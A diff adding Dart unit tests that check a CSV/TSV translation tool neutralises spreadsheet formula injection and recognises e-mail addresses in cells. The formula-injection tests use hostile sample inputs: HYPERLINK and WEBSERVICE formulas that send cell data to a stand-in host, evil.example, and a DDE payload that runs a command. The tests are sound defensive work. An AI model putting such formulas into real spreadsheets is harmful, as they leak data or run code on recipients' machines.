@@ -106,6 +106,125 @@ void main() {
     });
   });
 
+  group('formula injection', () {
+    const sheet =
+        'id,text\n1,Hello there\n2,How are you\n3,Good morning\n'
+        '4,"Thanks, bye"\n';
+
+    test('translations that start like a formula get a quote', () {
+      final document = parseDelimited(sheet, DocumentFormat.csv);
+      expect(texts(document), hasLength(4));
+      final output = document.render([
+        '=HYPERLINK("https://evil.example/?d="&A1,"Click")',
+        "=cmd|' /C calc'!A0",
+        '  @SUM(1+1)',
+        '+1+1',
+      ]);
+      expect(
+        output,
+        'id,text\n'
+        '1,"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"\n'
+        "2,'=cmd|' /C calc'!A0\n"
+        "3,'  @SUM(1+1)\n"
+        '4,"\'+1+1"\n',
+      );
+      final more = document.render(['-2+3', '\t=1+1', '\r=1+1', 'A = B']);
+      expect(
+        more,
+        'id,text\n'
+        "1,'-2+3\n"
+        "2,'\t=1+1\n"
+        '3,"\'\r=1+1"\n'
+        '4,"A = B"\n',
+      );
+    });
+
+    test('in TSV too, without quotes', () {
+      const tsv = 'id\ttext\n1\tHello there\n2\tHow are you\n';
+      final document = parseDelimited(tsv, DocumentFormat.tsv);
+      final output = document.render([
+        '=WEBSERVICE("https://evil.example/"&A1)',
+        '\t=1+1',
+      ]);
+      expect(
+        output,
+        'id\ttext\n'
+        '1\t\'=WEBSERVICE("https://evil.example/"&A1)\n'
+        "2\t' =1+1\n",
+      );
+    });
+
+    test('cells that already start that way are left as they are', () {
+      const list =
+          'id,item\n1,- buy milk today\n2,@team please review\n'
+          '3,+ add the notes\n4,Some plain words\n';
+      final document = parseDelimited(list, DocumentFormat.csv);
+      expect(texts(document), [
+        '- buy milk today',
+        '@team please review',
+        '+ add the notes',
+        'Some plain words',
+      ]);
+      final output = document.render([
+        '- Milch kaufen',
+        '@team bitte prüfen',
+        '+ Notizen ergänzen',
+        '=1+1',
+      ]);
+      expect(
+        output,
+        'id,item\n1,- Milch kaufen\n2,@team bitte prüfen\n'
+        "3,+ Notizen ergänzen\n4,'=1+1\n",
+      );
+    });
+  });
+
+  group('values', () {
+    test('e-mail addresses are recognised in linear time', () {
+      const contacts =
+          'id,mail,note\n'
+          '1,ada@example.com,Call back soon\n'
+          '2,bob.smith@mail.example.org,Sent the offer\n'
+          '3,cy@host.co,Waiting for an answer\n';
+      final document = parseDelimited(contacts, DocumentFormat.csv);
+      expect(texts(document), [
+        'Call back soon',
+        'Sent the offer',
+        'Waiting for an answer',
+      ]);
+      // Not addresses: translated (as text with words).
+      const odd =
+          'id,text\n'
+          '1,@example.com hello\n'
+          '2,a@b@c.de hello\n'
+          '3,ab@.de hello\n';
+      expect(texts(parseDelimited(odd, DocumentFormat.csv)), hasLength(3));
+      for (final cell in ['ab@cd', 'ab@cd.', '@cd.ef']) {
+        final one = parseDelimited(
+          'id,text\n1,Hello there\n2,Good bye\n3,$cell\n',
+          DocumentFormat.csv,
+        );
+        expect(texts(one), contains(cell), reason: cell);
+      }
+      final address = parseDelimited(
+        'id,text\n1,Hello there\n2,Good bye\n3,ab@cd.ef\n',
+        DocumentFormat.csv,
+      );
+      expect(texts(address), isNot(contains('ab@cd.ef')));
+    });
+
+    test('long cells are text, whatever they look like', () {
+      final long = 'a@${'b' * 300}.com';
+      final document = parseDelimited(
+        'id,text\n1,Hello there\n2,$long\n',
+        DocumentFormat.csv,
+      );
+      // Protected as an e-mail address inside the cell instead.
+      expect(document.segments, hasLength(1));
+      expect(document.render(['Hallo', 'x']), contains(long));
+    });
+  });
+
   test('keeps cells whose words are all placeholders', () {
     const sheet = 'title,body\n{{name}},Some text here\n';
     final document = parseDelimited(sheet, DocumentFormat.csv);
